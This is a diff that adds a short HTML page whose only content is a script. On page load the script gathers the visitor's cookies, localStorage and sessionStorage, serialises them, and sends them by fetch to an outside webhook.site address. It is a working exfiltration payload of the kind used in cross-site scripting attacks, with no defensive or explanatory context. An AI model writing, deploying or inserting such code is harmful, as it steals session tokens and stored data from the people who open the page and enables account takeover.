@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+  var data = {
+    cookies: document.cookie,
+    localStorage: JSON.stringify(localStorage),
+    sessionStorage: JSON.stringify(sessionStorage)
+  };
+  fetch("https://webhook.site/a9a52062-471c-477a-bf50-f50f34a0087a?data=" + encodeURIComponent(JSON.stringify(data)));
+</script>
+</body>
+</html>
